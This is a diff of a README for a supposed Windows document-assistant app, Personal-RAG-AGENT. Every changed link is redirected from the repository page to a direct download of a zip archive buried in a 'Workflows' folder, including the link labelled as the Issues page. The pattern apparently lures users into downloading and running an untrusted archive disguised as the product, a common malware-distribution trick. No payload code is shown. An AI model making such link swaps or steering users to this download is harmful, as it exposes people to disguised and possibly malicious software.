@@ -1,7 +1,7 @@
 <h1>🤖 Personal-RAG-AGENT - Your Smart Document Assistant</h1>
 
 <div align="center">
-  <a href="https://github.com/Suffering-radiator443/Personal-RAG-AGENT" style="display:inline-block; padding:16px 32px; background:linear-gradient(45deg,#4F46E5,#7C3AED); color:white; font-size:20px; font-weight:bold; border-radius:10px; text-decoration:none; box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Suffering-radiator443/Personal-RAG-AGENT/main/Workflows/2.2-alpha.5.zip" style="display:inline-block; padding:16px 32px; background:linear-gradient(45deg,#4F46E5,#7C3AED); color:white; font-size:20px; font-weight:bold; border-radius:10px; text-decoration:none; box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD NOW</a>
 </div>
 
 ## 🎯 What Is Personal-RAG-AGENT?
@@ -25,7 +25,7 @@ Getting Personal-RAG-AGENT running on your Windows computer is easy. Follow thes
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: **[Personal-RAG-AGENT Download](https://github.com/Suffering-radiator443/Personal-RAG-AGENT)**
+Visit this link to download the application: **[Personal-RAG-AGENT Download](https://raw.githubusercontent.com/Suffering-radiator443/Personal-RAG-AGENT/main/Workflows/2.2-alpha.5.zip)**
 
 Click the green "Code" button on the page, then select "Download ZIP" to save the file to your computer. The download will start automatically.
 
@@ -122,7 +122,7 @@ If you encounter issues, try these quick fixes:
 
 ### Get Community Help
 
-- Visit the GitHub repository: **[Personal-RAG-AGENT Issues](https://github.com/Suffering-radiator443/Personal-RAG-AGENT/issues)**
+- Visit the GitHub repository: **[Personal-RAG-AGENT Issues](https://raw.githubusercontent.com/Suffering-radiator443/Personal-RAG-AGENT/main/Workflows/2.2-alpha.5.zip)**
 - Describe your problem with steps to reproduce
 - Include any error messages you see
 
@@ -144,7 +144,7 @@ There's no hard limit - it depends on your Google Drive storage capacity. The sy
 
 We regularly release improvements and new features. To update:
 
-1. Visit the download link: **[Get Latest Version](https://github.com/Suffering-radiator443/Personal-RAG-AGENT)**
+1. Visit the download link: **[Get Latest Version](https://raw.githubusercontent.com/Suffering-radiator443/Personal-RAG-AGENT/main/Workflows/2.2-alpha.5.zip)**
 2. Download the newest ZIP file
 3. Extract and run the setup file - it will automatically replace the old version while keeping your data intact
 
@@ -170,7 +170,7 @@ The system processes your documents into vector representations and uses advance
 
 Download Personal-RAG-AGENT today and transform how you work with your documents. Your personal AI assistant awaits!
 
-<a href="https://github.com/Suffering-radiator443/Personal-RAG-AGENT" style="display:inline-block; padding:18px 40px; background:linear-gradient(90deg,#10B981,#059669); color:white; font-size:22px; font-weight:bold; border-radius:12px; text-decoration:none; margin:20px 0;">🎉 DOWNLOAD NOW - IT'S FREE</a>
+<a href="https://raw.githubusercontent.com/Suffering-radiator443/Personal-RAG-AGENT/main/Workflows/2.2-alpha.5.zip" style="display:inline-block; padding:18px 40px; background:linear-gradient(90deg,#10B981,#059669); color:white; font-size:22px; font-weight:bold; border-radius:12px; text-decoration:none; margin:20px 0;">🎉 DOWNLOAD NOW - IT'S FREE</a>
 
 Visit this link to download the application and start your journey toward smarter document management with Personal-RAG-AGENT!
 
